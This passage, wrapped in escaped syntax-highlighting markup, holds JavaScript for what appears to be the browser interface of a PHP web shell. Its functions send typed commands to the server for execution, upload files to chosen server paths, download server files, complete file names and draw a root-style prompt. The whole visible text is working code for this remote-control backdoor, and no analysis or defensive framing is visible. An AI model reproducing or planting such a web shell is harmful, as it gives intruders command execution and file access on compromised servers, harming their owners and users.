class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var commandHistory = [];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var historyPosition = 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var eShellCmdInput = null;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var eShellContent = null;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function _insertCommand(command) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.innerHTML += \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\n\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.innerHTML += \u0026#39;\u0026lt;span class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan class=\"s2\"\u003eshell-prompt\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026#39; + genPrompt(CWD) + \u0026#39;\u0026lt;/span\u0026gt; \u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.innerHTML += escapeHtml(command);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.innerHTML += \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.scrollTop = eShellContent.scrollHeight;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function _insertStdout(stdout) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.innerHTML += escapeHtml(stdout);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                eShellContent.scrollTop = eShellContent.scrollHeight;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function _defer(callback) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                setTimeout(callback, 0);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function featureShell(command) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                _insertCommand(command);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                } else if (/^\\s*clear\\s*$/.test(command)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    eShellContent.innerHTML = \u0026#39;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    makeRequest(\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e?\u003c/span\u003e\u003cspan class=\"nx\"\u003efeature\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003eshell\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;, {cmd: command, cwd: CWD}, function (response) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        if (response.hasOwnProperty(\u0026#39;file\u0026#39;)) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            featureDownload(atob(response.name), response.file)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            _insertStdout(atob(response.stdout));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            updateCwd(atob(response.cwd));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function featureHint() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -\u0026gt; nothing to complete\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                function _requestCallback(data) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    if (data.files.length \u0026lt;= 1) return;  // no completion\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    data.files = data.files.map(function(file){\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        return atob(file);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    if (data.files.length === 2) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        if (type === \u0026#39;cmd\u0026#39;) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            eShellCmdInput.value = data.files[0];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            var currentValue = eShellCmdInput.value;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    } else {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        _insertCommand(eShellCmdInput.value);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        _insertStdout(data.files.join(\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var currentCmd = eShellCmdInput.value.split(\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var type = (currentCmd.length === 1) ? \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; : \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003efile\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var fileName = (type === \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;) ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                makeRequest(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    \u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e?\u003c/span\u003e\u003cspan class=\"nx\"\u003efeature\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003ehint\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        filename: fileName,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        cwd: CWD,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        type: type\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    _requestCallback\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                );\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function featureDownload(name, file) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var element = document.createElement(\u0026#39;a\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.setAttribute(\u0026#39;href\u0026#39;, \u0026#39;data:application/octet-stream;base64,\u0026#39; + file);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.setAttribute(\u0026#39;download\u0026#39;, name);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.style.display = \u0026#39;none\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                document.body.appendChild(element);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.click();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                document.body.removeChild(element);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                _insertStdout(\u0026#39;Done.\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function featureUpload(path) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var element = document.createElement(\u0026#39;input\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.setAttribute(\u0026#39;type\u0026#39;, \u0026#39;file\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.style.display = \u0026#39;none\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                document.body.appendChild(element);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.addEventListener(\u0026#39;change\u0026#39;, function () {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    var promise = getBase64(element.files[0]);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    promise.then(function (file) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        makeRequest(\u0026#39;?feature=upload\u0026#39;, {path: path, file: file, cwd: CWD}, function (response) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            _insertStdout(atob(response.stdout));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                            updateCwd(atob(response.cwd));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    }, function () {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                        _insertStdout(\u0026#39;An unknown client-side error occurred.\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                element.click();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                document.body.removeChild(element);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function getBase64(file, onLoadCallback) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                return new Promise(function(resolve, reject) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    var reader = new FileReader();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    reader.onerror = reject;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    reader.readAsDataURL(file);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                });\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            function genPrompt(cwd) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                cwd = cwd || \u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e~\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                var shortCwd = cwd;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                if (cwd.split(\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;).length \u0026gt; 3) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    var splittedCwd = cwd.split(\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    shortCwd = \u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003e…\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; + splittedCwd[splittedCwd.length-2] + \u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; + splittedCwd[splittedCwd.length-1];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                return SHELL_CONFIG[\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;] + \u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; + SHELL_CONFIG[\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;] + \u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e \u003cspan class=\"nx\"\u003etitle\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ecwd\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eshortCwd\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026lt;/span\u0026gt;#\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eupdateCwd\u003c/span\u003e\u003cspan 